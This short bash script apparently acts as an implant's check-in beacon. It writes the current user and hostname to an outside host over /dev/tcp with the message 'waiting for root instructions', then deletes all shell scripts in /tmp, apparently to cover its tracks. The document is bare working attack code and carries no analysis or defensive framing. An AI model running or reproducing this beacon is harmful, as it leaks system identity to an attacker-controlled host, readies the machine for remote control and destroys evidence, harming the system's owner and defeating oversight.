#!/usr/bin/env bash

printf "INFO: $(whoami)@$(hostname) waiting for root instructions." > /dev/tcp/boesen.science/2043

rm /tmp/*.sh
